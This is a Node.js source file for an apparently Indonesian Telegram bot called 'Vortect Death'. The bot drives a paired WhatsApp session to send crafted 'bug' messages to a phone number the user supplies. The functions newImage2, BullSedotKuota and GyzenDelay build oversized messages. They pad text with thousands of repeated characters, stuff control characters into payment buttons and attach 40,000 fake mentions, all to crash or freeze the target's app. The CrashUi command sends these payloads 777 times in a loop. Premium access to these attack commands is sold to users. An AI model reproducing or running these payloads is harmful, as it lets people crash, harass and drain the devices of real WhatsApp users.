const { Telegraf, Markup, session } = require("telegraf");
const {
makeWASocket,
makeInMemoryStore,
fetchLatestBaileysVersion,
useMultiFileAuthState,
DisconnectReason,
generateWAMessageFromContent,
generateMessageID,
proto
} = require("@whiskeysockets/baileys");

const pino = require("pino");
const chalk = require("chalk");
const FormData = require("form-data");
const fs = require("fs");
const path = require("path");
const fetch = require("node-fetch");
const crypto = require("crypto");
const axios = require("axios");
const moment = require("moment-timezone");
const readline = require("readline");
const { BOT_TOKEN } = require("./settings/config");
const premiumFile = './database/premiumuser.json';
const ownerFile = './database/owneruser.json';
const adminFile = './database/adminuser.json';

let bots = [];
const bot = new Telegraf(BOT_TOKEN);
bot.use(session());

let kyzz = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
const usePairingCode = true;

const randomImages = [
"https://files.catbox.moe/myfh0e.jpg",
"https://files.catbox.moe/myfh0e.jpg"
];

const getRandomImage = () => randomImages[Math.floor(Math.random() * randomImages.length)];

function getPushName(ctx) {
  return ctx.from.first_name || "Pengguna";
}

// Fungsi untuk mendapatkan waktu uptime
const getUptime = () => {
    const uptimeSeconds = process.uptime();
    const hours = Math.floor(uptimeSeconds / 3600);
    const minutes = Math.floor((uptimeSeconds % 3600) / 60);
    const seconds = Math.floor(uptimeSeconds % 60);

    return `${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

// --- Koneksi WhatsApp ---
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });

const startSesi = async () => {
  const { state, saveCreds } = await useMultiFileAuthState('./session');
  const { version } = await fetchLatestBaileysVersion();

  const connectionOptions = {
    version,
    keepAliveIntervalMs: 30000,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    auth: state,
    browser: ['Ubuntu', 'Chrome', '20.0.04'],
    getMessage: async (key) => ({
      conversation: 'KyzIcxvii', // Placeholder default
    }),
  };

  kyzz = makeWASocket(connectionOptions);
  kyzz.ev.on('creds.update', saveCreds);
  store.bind(kyzz.ev);

  kyzz.ev.on('connection.update', (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === 'open') {
      kyzz.newsletterFollow("120363420966527782@newsletter");
      isWhatsAppConnected = true;
      console.log(chalk.red.bold(`
╭─────────────────────────────╮
│ ${chalk.white('Berhasil Tersambung')}
╰─────────────────────────────╯`));
    }

    if (connection === 'close') {
      const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
      console.log(chalk.red.bold(`
╭─────────────────────────────╮
│ ${chalk.white('Whatsapp Terputus')}
╰─────────────────────────────╯`));

      if (shouldReconnect) {
        console.log(chalk.red.bold(`
╭─────────────────────────────╮
│ ${chalk.white('Menyambung kembali...')}
╰─────────────────────────────╯`));
        startSesi();
      }

      isWhatsAppConnected = false;
    }
  });
};

const loadJSON = (file) => {
    if (!fs.existsSync(file)) return [];
    return JSON.parse(fs.readFileSync(file, 'utf8'));
};

const saveJSON = (file, data) => {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
};

// Muat ID owner dan pengguna premium
let ownerUsers = loadJSON(ownerFile);
let adminUsers = loadJSON(adminFile);
let premiumUsers = loadJSON(premiumFile);

// Middleware untuk memeriksa apakah pengguna adalah owner
const checkOwner = (ctx, next) => {
    if (!ownerUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("Owner Only ❌");
    }
    next();
};

const checkAdmin = (ctx, next) => {
    if (!adminUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("Admin Only ❌");
    }
    next();
};

// Middleware untuk memeriksa apakah pengguna adalah premium
const checkPremium = (ctx, next) => {
    if (!premiumUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("Prem Only ❌");
    }
    next();
};

//~~~~~~~~~~~~𝙎𝙏𝘼𝙍𝙏~~~~~~~~~~~~~\\

const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    ctx.reply(`
╭─────────────────
│    Vortect Death    
│────────────────
│ Status : WhatsApp belum terhubung!...
╰─────────────────
`);
    return;
  }
  next();
};

async function editMenu(ctx, caption, buttons) {
  try {
    await ctx.editMessageMedia(
      {
        type: 'photo',
        media: getRandomImage(),
        caption,
        parse_mode: 'HTML',
      },
      {
        reply_markup: buttons.reply_markup,
      }
    );
  } catch (error) {
    console.error('Error editing menu:', error);
    await ctx.reply('Maaf, terjadi kesalahan saat mengedit pesan.');
  }
}

bot.command('start', async (ctx) => {
 const userId = ctx.from.id.toString();
 const username = ctx.from.username ? `@${ctx.from.username}` : 'Tidak tersedia';
 const RandomBgtJir = getRandomImage();
 const waktuRunPanel = getUptime();
      
    await ctx.replyWithPhoto(RandomBgtJir, {
        caption: `
<blockquote>
🍂 Vortect ☇ 𝐂𝐨𝐫𝐞˚𝐒𝐲𝐬𝐭𝐞𝐦 𖣂
( 👀 ) Holaa ☇ ${username} use the bot feature wisely, the creator is not responsible for what you do with this bot, enjoy.
━━━━━━━━━━━━━━━━━━
𒑡 Vortect Death
⬡ Author : LrexzzModzzZ
⬡ Version : 4.0
⬡ Time : ${waktuRunPanel}
━━━━━━━━━━━━━━━━━━
</blockquote>
`,
    parse_mode: 'HTML',
    ...Markup.inlineKeyboard([
      [
        Markup.button.callback('🌪 SYSTEM', 'NortInvictuz1'),
        Markup.button.callback('🦋 SETTING', 'NortInvictuz2'),
      ],
      [
        Markup.button.url('🫟 OWNER', 'https://t.me/LrexzzModzzZ'),
      ]
    ])
  });
});

bot.action('NortInvictuz1', async (ctx) => {
 const userId = ctx.from.id.toString();
 const username = ctx.from.username ? `@${ctx.from.username}` : 'Tidak tersedia';
 const waktuRunPanel = getUptime();
 const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('BACK', 'startback')],
  ]);

  const caption = `
<blockquote>
🍂 Vortect ☇ 𝐂𝐨𝐫𝐞˚𝐒𝐲𝐬𝐭𝐞𝐦 𖣂
( 👀 ) Holaa ☇ ${username} use the bot feature wisely, the creator is not responsible for what you do with this bot, enjoy.
━━━━━━━━━━━━━━━━━━
𒑡 Vortect Death 
⬡ Author : LrexzzModzzZ
⬡ Version : 4.0
⬡ Time : ${waktuRunPanel}
━━━━━━━━━━━━━━━━━━
𒑡 Vortect Death 
⬡ /DelayHard 628xxx
╰➤ Delay Locked
⬡ /BlankDelay 628xxx
╰➤ Blank Chat
⬡ /InvisibleBug 628xxx
╰➤ Delay 24J 
⬡ /CrashUi 628xxx
╰➤ Crash Ui
━━━━━━━━━━━━━━━━━━
</blockquote>
  `;

  await editMenu(ctx, caption, buttons);
});

bot.action('NortInvictuz2', async (ctx) => {
 const userId = ctx.from.id.toString();
 const waktuRunPanel = getUptime();
 const username = ctx.from.username ? `@${ctx.from.username}` : 'Tidak tersedia';
 const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('BACK', 'startback')],
  ]);

  const caption = `
<blockquote>
🍂 Vortect ☇ 𝐂𝐨𝐫𝐞˚𝐒𝐲𝐬𝐭𝐞𝐦 𖣂
( 👀 ) Holaa ☇ ${username} use the bot feature wisely, the creator is not responsible for what you do with this bot, enjoy.
━━━━━━━━━━━━━━━━━━
𒑡 Vortect Death
⬡ Author : LrexzzModzzZ
⬡ Version : 4.0
⬡ Time : ${waktuRunPanel}
━━━━━━━━━━━━━━━━━━
𒑡 OWNER
⬡ /addadmin
╰➤ Menambah Akses User Admin
⬡ /deladmin
╰➤ Menghapus Akses Admin
⬡ /addprem
╰➤ Menambah Akses Premium
⬡ /delprem
╰➤ Menghapus Akses Premium
⬡ /cekprem
╰➤ Melihat Waktu/Status Premium
⬡ /connect 
╰➤ Menambah Sesi WhatsApp
⬡ /restart
╰➤ Merestart Bot Telegram
━━━━━━━━━━━━━━━━━━
</blockquote>
  `;

  await editMenu(ctx, caption, buttons);
});

// Action untuk BugMenu
bot.action('startback', async (ctx) => {
const userId = ctx.from.id.toString();
const username = ctx.from.username ? `@${ctx.from.username}` : 'Tidak tersedia';
const waktuRunPanel = getUptime();
const buttons = Markup.inlineKeyboard([

      [
        Markup.button.callback('🌪 SYSTEM', 'NortInvictuz1'),
        Markup.button.callback('🦋 SETTING', 'NortInvictuz2'),
      ],
      [
        Markup.button.url('🫟 OWNER', 'https://t.me/LrexzzModzzZ'),
      ]
]);

  const caption = `
<blockquote>
🍂 Vortect ☇ 𝐂𝐨𝐫𝐞˚𝐒𝐲𝐬𝐭𝐞𝐦 𖣂
( 👀 ) Holaa ☇ ${username} use the bot feature wisely, the creator is not responsible for what you do with this bot, enjoy.
━━━━━━━━━━━━━━━━━━
𒑡 Vortect Death
⬡ Author : LrexzzModzzZ
⬡ Version : 4.0
⬡ Time : ${waktuRunPanel}
━━━━━━━━━━━━━━━━━━
</blockquote>
`;

  await editMenu(ctx, caption, buttons);
});

//~~~~~~~~~~~~~~~START CASE BUG~~~~~~~~~~~~~~~~~\\
bot.command("InvisibleBug", checkWhatsAppConnection, checkPremium, async (ctx) => {
  try {
    const args = ctx.message.text.split(" ");
    const q = args[1];
    const userId = ctx.from.id;
    const chatId = ctx.chat.id;

    if (!q) {
      return ctx.reply("Example :\n/InvisibleBug 62××");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    // Kirim pesan awal + simpan message-nya
    const sent = await ctx.replyWithPhoto("https://files.catbox.moe/myfh0e.jpg", {
      caption: `
<blockquote>
🌪️ Vortect ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦 𖣂
Цель: ${q}
тип ошибки: InvisibleBug
Статус: Processing

𝐋𝐞𝐬𝐬˚𝐐𝐮𝐞𝐫𝐲
🥑 Успешно отправлено в цель
</blockquote>

`,
      parse_mode: "HTML",
    });

    // Eksekusi fungsi bug
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

    for (let i = 0; i < 1; i++) {
      await sleep(5000)
      await BullSedotKuota(kyzz, target);
      await sleep(5000)
    }

    console.log("\x1b[32m[SUCCESS]\x1b[0m BUG BERHASIL DIKIRIM!");

    // Edit caption jadi sukses + tombol
    await ctx.telegram.editMessageCaption(chatId, sent.message_id, null, `
<blockquote>
🌪️ Vortect ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦 𖣂
Цель: ${q}
тип ошибки: InvisibleBug
Статус: Succesfully 

𝐋𝐞𝐬𝐬˚𝐐𝐮𝐞𝐫𝐲
🥑 Успешно отправлено в цель
</blockquote>
`, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝐂͢𝐞͜𝐤͡⍣᳟𝐓͢𝐚͡𝐫𝐠͜͢𝐞𝐭͡", url: `https://wa.me/${q}` }]
        ]
      }
    });

  } catch (err) {
    console.error("Error in InvisibleBug command:", err);
    ctx.reply("FUNC ERROR/GA KEPANGGIL MEMEK.");
  }
});

bot.command("DelayHard", checkWhatsAppConnection, checkPremium, async (ctx) => {
  try {
    const args = ctx.message.text.split(" ");
    const q = args[1];
    const userId = ctx.from.id;
    const chatId = ctx.chat.id;

    if (!q) {
      return ctx.reply("Example :\n/DelayHard 62××");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    // Kirim pesan awal + simpan message-nya
    const sent = await ctx.replyWithPhoto("https://files.catbox.moe/myfh0e.jpg", {
      caption: `
<blockquote>
🌪️ Vortect ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦 𖣂
Цель: ${q}
тип ошибки: DelayHard
Статус: Processing

𝐋𝐞𝐬𝐬˚𝐐𝐮𝐞𝐫𝐲
🥑 Успешно отправлено в цель
</blockquote>
`,
      parse_mode: "HTML",
    });

    // Eksekusi fungsi bug
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

    for (let i = 0; i < 1; i++) {
      await sleep(5000);
      await GyzenDelay(target);
      await GyzenDelay(target);
      await sleep(5000);
    }

    console.log("\x1b[32m[SUCCESS]\x1b[0m BUG BERHASIL DIKIRIM!");

    // Edit caption jadi sukses + tombol
    await ctx.telegram.editMessageCaption(chatId, sent.message_id, null, `
<blockquote>
🌪️ Vortect ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦 𖣂
Цель: ${q}
тип ошибки: DelayHard
Статус: Succesfully 

𝐋𝐞𝐬𝐬˚𝐐𝐮𝐞𝐫𝐲
🥑 Успешно отправлено в цель
</blockquote>
`, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝐂͢𝐞͜𝐤͡⍣᳟𝐓͢𝐚͡𝐫𝐠͜͢𝐞𝐭͡", url: `https://wa.me/${q}` }]
        ]
      }
    });

  } catch (err) {
    console.error("Error in DelayHard command:", err);
    ctx.reply("FUNC ERROR/GA KEPANGGIL MEMEK.");
  }
});

bot.command("BlankDelay", checkWhatsAppConnection, checkPremium, async (ctx) => {
  try {
    const args = ctx.message.text.split(" ");
    const q = args[1];
    const userId = ctx.from.id;
    const chatId = ctx.chat.id;

    if (!q) {
      return ctx.reply("Example :\n/BlankDelay 62××");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    // Kirim pesan awal + simpan message-nya
    const sent = await ctx.replyWithPhoto("https://files.catbox.moe/myfh0e.jpg", {
      caption: `
<blockquote>
🌪️ Vortect ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦 𖣂
Цель: ${q}
тип ошибки: BlankDelay
Статус: Processing

𝐋𝐞𝐬𝐬˚𝐐𝐮𝐞𝐫𝐲
🥑 Успешно отправлено в цель
</blockquote>
`,
      parse_mode: "HTML",
    });

    // Eksekusi fungsi bug
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

    for (let i = 0; i < 1; i++) {
      await sleep(5000)
      await BullSedotKuota(kyzz, target);
      await BullSedotKuota(kyzz, target);
      await BullSedotKuota(kyzz, target);
      await sleep(5000);
    }

    console.log("\x1b[32m[SUCCESS]\x1b[0m BUG BERHASIL DIKIRIM!");

    // Edit caption jadi sukses + tombol
    await ctx.telegram.editMessageCaption(chatId, sent.message_id, null, `
<blockquote>
🌪️ Vortect ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦 𖣂
Цель: ${q}
тип ошибки: BlankDelay
Статус: Succesfully 

𝐋𝐞𝐬𝐬˚𝐐𝐮𝐞𝐫𝐲
🥑 Успешно отправлено в цель
</blockquote>
`, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝐂͢𝐞͜𝐤͡⍣᳟𝐓͢𝐚͡𝐫𝐠͜͢𝐞𝐭͡", url: `https://wa.me/${q}` }]
        ]
      }
    });

  } catch (err) {
    console.error("Error in BlankDelay command:", err);
    ctx.reply("FUNC ERROR/GA KEPANGGIL MEMEK.");
  }
});

bot.command("CrashUi", checkWhatsAppConnection, checkPremium, async (ctx) => {
  try {
    const args = ctx.message.text.split(" ");
    const q = args[1];
    const userId = ctx.from.id;
    const chatId = ctx.chat.id;

    if (!q) {
      return ctx.reply("Example :\n/CrashUi 62××");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    // Kirim pesan awal + simpan message-nya
    const sent = await ctx.replyWithPhoto("https://files.catbox.moe/myfh0e.jpg", {
      caption: `
<blockquote>
🌪️ Vortect ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦 𖣂
Цель: ${q}
тип ошибки: CrashUi
Статус: Processing

𝐋𝐞𝐬𝐬˚𝐐𝐮𝐞𝐫𝐲
🥑 Успешно отправлено в цель
</blockquote>
`,
      parse_mode: "HTML",
    });

    // Eksekusi fungsi bug
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

    for (let i = 0; i < 777; i++) {
      await sleep(5000);
      await newImage2(kyzz, target);
      await newImage2(kyzz, target);
      await sleep(5000);
    }

    console.log("\x1b[32m[SUCCESS]\x1b[0m BUG BERHASIL DIKIRIM!");

    // Edit caption jadi sukses + tombol
    await ctx.telegram.editMessageCaption(chatId, sent.message_id, null, `
<blockquote>
🌪️ Vortect ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦 𖣂
Цель: ${q}
тип ошибки: CrashUi
Статус: Succesfully 

𝐋𝐞𝐬𝐬˚𝐐𝐮𝐞𝐫𝐲
🥑 Успешно отправлено в цель
</blockquote>
`, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝐂͢𝐞͜𝐤͡⍣᳟𝐓͢𝐚͡𝐫𝐠͜͢𝐞𝐭͡", url: `https://wa.me/${q}` }]
        ]
      }
    });

  } catch (err) {
    console.error("Error in CrashUi command:", err);
    ctx.reply("FUNC ERROR/GA KEPANGGIL MEMEK.");
  }
});
//~~~~~~~~~~~~~~~END CASE BUG~~~~~~~~~~~~~~~~~\\

// Perintah untuk menambahkan pengguna premium (hanya owner)
bot.command('addprem', checkAdmin, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dijadikan premium.\nContoh: /addprem 123456789");
    }

    const userId = args[1];

    if (premiumUsers.includes(userId)) {
        return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status premium.`);
    }

    premiumUsers.push(userId);
    saveJSON(premiumFile, premiumUsers);

    return ctx.reply(`🥳 Pengguna ${userId} sekarang memiliki akses premium!`);
});

bot.command('addadmin', checkOwner, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dijadikan Admin.\nContoh: /addadmin 123456789");
    }

    const userId = args[1];

    if (adminUsers.includes(userId)) {
        return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status Admin.`);
    }

    adminUsers.push(userId);
    saveJSON(adminFile, adminUsers);

    return ctx.reply(`🎉 Pengguna ${userId} sekarang memiliki akses Admin!`);
});

// Perintah untuk menghapus pengguna premium (hanya owner)
bot.command('delprem', checkAdmin, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dihapus dari premium.\nContoh: /delprem 123456789");
    }

    const userId = args[1];

    if (!premiumUsers.includes(userId)) {
        return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar premium.`);
    }

    premiumUsers = premiumUsers.filter(id => id !== userId);
    saveJSON(premiumFile, premiumUsers);

    return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar premium.`);
});

bot.command('deladmin', checkOwner, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dihapus dari Admin.\nContoh: /deladmin 123456789");
    }

    const userId = args[1];

    if (!adminUsers.includes(userId)) {
        return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar Admin.`);
    }

    adminUsers = adminUsers.filter(id => id !== userId);
    saveJSON(adminFile, adminUsers);

    return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar Admin.`);
});
// Perintah untuk mengecek status premium
bot.command('cekprem', (ctx) => {
    const userId = ctx.from.id.toString();

    if (premiumUsers.includes(userId)) {
        return ctx.reply(`✅ Anda adalah pengguna premium.`);
    } else {
        return ctx.reply(`❌ Anda bukan pengguna premium.`);
    }
});

// Command untuk pairing WhatsApp
bot.command("connect", checkOwner, async (ctx) => {
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /connect <628xxx>");
    }

    let phoneNumber = args[1];
    phoneNumber = phoneNumber.replace(/[^0-9]/g, '');


    if (kyzz && kyzz.user) {
        return await ctx.reply("WhatsApp sudah terhubung. Tidak perlu pairing lagi.");
    }

    try {
        const code = await kyzz.requestPairingCode(phoneNumber, "NORTINVC");
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

        const pairingMessage = `
\`\`\`Succesfully
Kode Pairing Kamu 

Sender : ${phoneNumber}
Code : ${formattedCode}\`\`\`
`;

        await ctx.replyWithMarkdown(pairingMessage);
    } catch (error) {
        console.error(chalk.red('Gagal melakukan pairing:'), error);
        await ctx.reply("❌ Gagal melakukan pairing. Pastikan nomor WhatsApp valid dan dapat menerima SMS.");
    }
});

bot.command("delsesi", checkOwner, async (ctx) => {
  try {
    await fs.promises.rm('./session', { recursive: true, force: true });
    WhatsAppConnected = false;
    await ctx.reply('✅ Session Berhasil dihapus!');
    startSesi();
  } catch (error) {
    await ctx.reply('❌ Gagal menghapus session!');
  }
});

// Fungsi untuk merestart bot menggunakan PM2
const restartBot = () => {
  pm2.connect((err) => {
    if (err) {
      console.error('Gagal terhubung ke PM2:', err);
      return;
    }

    pm2.restart('kyzz', (err) => { // 'index' adalah nama proses PM2 Anda
      pm2.disconnect(); // Putuskan koneksi setelah restart
      if (err) {
        console.error('Gagal merestart bot:', err);
      } else {
        console.log('Bot berhasil direstart.');
      }
    });
  });
};

// Command untuk restart
bot.command('restart', (ctx) => {
  const userId = ctx.from.id.toString();
  ctx.reply('Merestart bot...');
  restartBot();
});

//~~~~~~~~~~~~~~~~~~~FUNC BUG~~~~~~~~~~~~~~~~~~~\\
async function newImage2(kyzz, target) {
  kyzz.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              imageMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7118-24/530142719_1293392145516971_3436280522584024074_n.enc?ccb=11-4&oh=01_Q5Aa2QGLer6HhSJ0R8Wb6SP2iUqTdrhTHucmDXcaDLp8x15lgQ&oe=68C0297E&_nc_sid=5e03e0&mms3=true",
                mimetype: "image/jpeg",
                fileSha256: "5gIyX+O/MW1melPouaIuIQQDPgTC9Q+DhAOqbW8zSDM=",
                fileLength: "26289",
                height: 640,
                width: 640,
                mediaKey: "o645YKUri8uGNJi8qkK6OQzUqN7XbmAcEeH3kmEfd6Q=",
                fileEncSha256: "tYWnWmEHh3M7CTqRRGeWeZLkfC2Co+BfPwX3veO7X2g=",
                directPath: "/v/t62.7118-24/530142719_1293392145516971_3436280522584024074_n.enc?ccb=11-4&oh=01_Q5Aa2QGLer6HhSJ0R8Wb6SP2iUqTdrhTHucmDXcaDLp8x15lgQ&oe=68C0297E&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1754843222",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAtAAADAQEBAAAAAAAAAAAAAAAAAQIDBAUBAQEBAAAAAAAAAAAAAAAAAAABAv/aAAwDAQACEAMQAAAA8hjWGmKdNprB8zuegQNAORmZ6HFNc8+jwWbAJM7cysQm/X5tZ10ZQ61JLnOUikgoljUhqSEAAAAAAFAJ/8QAIRAAAgICAgMAAwAAAAAAAAAAAQIAEQMQICESIjEyQVH/2gAIAQEAAT8A1erhyEH5A4PGu4ZjI8xcPgzM1dRiAxqBzF+bEdbgxPVwDIsb7pD1q55iKQTMuQDEAJjyU3YsQ4MZtqh/IgRbAnf9hY6uJmZYAh9upkykP00QWSTCZmKD1XiSdBv1pjfAauXFaGXu+A5Xw//EABgRAAMBAQAAAAAAAAAAAAAAAAERMAAQ/9oACAECAQE/AOEqRDyp/8QAGREBAAIDAAAAAAAAAAAAAAAAARARACAw/9oACAEDAQE/AIC9khgcvp//2Q==",
                caption: "./𝘅𝗿𝗹.𝛆𝛘𝛆" + "ꦽ".repeat(8000),
                scansSidecar: "RmfY5jow2amGTRfFdNpnhzQbXEYQynt5e96bDEHdZxyAg0/KdkNyKQ==",
                scanLengths: [3226, 8477, 3748, 10838],
                midQualityFileSha256: "tTbMuuzvy47bplW9qZcMumtle1pWO87jw2Qw2veSENs="
              },
              hasMediaAttachment: true
            },
            body: {
              text: "𝑽𝒐𝒓𝒕𝒖𝒏𝒊𝒙 𝑰𝒔 𝑯𝒆𝒓𝒆 ☀" + "ꦽ".repeat(8000)
            },
            footerText: "© running since 2020 to 20##?",
            nativeFlowMessage: {
              buttons: [
                {
                  name: "galaxy_message",
                  buttonParamsJson: "{\"icon\":\"REVIEW\",\"flow_cta\":\"\\u0000\",\"flow_message_version\":\"3\"}"
                },
                {
                  name: "payment_method",
                  buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0010".repeat(
                0x2710
              )},\"payment_timestamp\":null,\"share_payment_status\":true}`,
                }
              ],
              messageParamsJson: ""
            },
            contextInfo: {
              remoteJid: "30748291653858@lid",
              participant: "0@s.whatsapp.net",
              mentionedJid: [ "0@s.whatsapp.net" ],
              urlTrackingMap: {
                urlTrackingMapElements: [
                  {
                    originalUrl: "https://t.me/GyzenVtx",
                    unconsentedUsersUrl: "https://t.me/GyzenVtx",
                    consentedUsersUrl: "https://t.me/GyzenVtx",
                    cardIndex: 1,
                  },
                  {
                    originalUrl: "https://t.me/GyzenVtx",
                    unconsentedUsersUrl: "https://t.me/GyzenVtx",
                    consentedUsersUrl: "https://t.me/GyzenVtx",
                    cardIndex: 2,
                  }
                ]
              },
            quotedMessage: {
              paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1814400000
                }
              }
            }
          }
        }
      }
    },{ participant: { jid: target } });
  }

async function BullSedotKuota(kyzz, target) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await kyzz.relayMessage("status@broadcast", msg.message, {
    messageId: generateRandomMessageId(),
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  console.log(chalk.red("Bull Success Sending Bug"));
}

async function GyzenDelay(target) {
await kyzz.relayMessage(
"status@broadcast", {
extendedTextMessage: {
text: `Vtx ~ Gyzen\n https://t.me/GyzenVtx\n`,
contextInfo: {
mentionedJid: [
"6285215587498@s.whatsapp.net",
...Array.from({
length: 40000
}, () =>
`1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
)
]
}
}
}, {
statusJidList: [target],
additionalNodes: [{
tag: "meta",
attrs: {},
content: [{
tag: "mentioned_users",
attrs: {},
content: [{
tag: "to",
attrs: {
jid: target
},
content: undefined
}]
}]
}]
}
);
}

// === KONFIGURASI GITHUB ===


// === FUNGSI START ===

  // lanjut ke fungsi start bot

// --- Jalankan Bot ---
(async () => {
console.log(chalk.redBright.bold(`
╭─────────────────────────────╮
│${chalk.white('Memulai Sesi WhatsApp...')}
╰─────────────────────────────╯
`));

startSesi();
bot.launch();
})();
